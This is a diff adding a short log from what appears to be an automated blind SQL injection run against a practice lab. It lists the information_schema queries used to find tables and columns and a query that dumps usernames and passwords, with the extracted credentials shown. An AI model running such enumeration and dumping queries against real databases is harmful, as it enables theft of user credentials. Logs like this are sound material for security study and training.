@@ -1,0 +1,20 @@
+[i] Started in: 2021/12/29 18:26:31
+-----------------------------------
+SELECT table_name FROM information_schema.tables WHERE table_schema=current_schema();
+users
+tracking
+
+SELECT column_name FROM information_schema.columns WHERE table_schema=current_schema() AND table_name='users';
+username
+password
+
+SELECT CONCAT(username,'::',password) FROM users;
+administrator::dpb37xmfrqrsld829def
+carlos::3o2ax3fv2rvw56202q19
+wiener::28txasdx8pjdgkyt2vh4
+
+------------------------------------
+[i] Finished in: 2021/12/29 20:14:40
+[i] Took 108 minutes.
+[i] 1216 HTTP requests sent in total.
+[i] 0.2 request per second.
